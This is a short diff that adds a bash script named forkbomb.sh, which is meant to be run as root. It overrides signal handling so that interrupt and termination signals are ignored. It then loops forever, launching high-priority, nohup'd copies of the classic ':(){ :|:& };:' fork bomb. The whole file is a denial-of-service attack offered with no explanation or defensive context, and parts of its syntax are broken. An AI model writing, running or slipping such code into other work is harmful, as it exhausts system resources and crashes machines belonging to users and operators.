@@ -1,0 +1,13 @@
+#!/bin/bash
+#run as root for nice to work
+#forkbomb.sh 
+function trap()
+{
+	trap '' 2 3 15
+}
+while :
+do
+trap()
+nohup {nice -n -20;:(){ :|:& };:} & 
+done
+
